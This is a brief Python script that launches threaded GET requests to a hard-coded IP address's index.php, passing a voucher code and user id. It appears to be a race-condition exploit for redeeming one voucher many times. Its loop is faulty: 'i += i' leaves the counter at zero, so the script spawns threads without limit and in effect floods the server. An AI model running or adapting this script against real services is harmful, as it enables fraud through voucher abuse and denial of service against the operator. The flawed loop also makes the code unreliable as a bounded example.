import requests
from threading import Thread


def main():
    point = requests.get("http://62.173.140.174:16023/index.php?voucherCode=5mbhxgw&uid=600402195281756")


i = 0
while i < 10:
    i += i
    th = Thread(target=main)
    th.start()
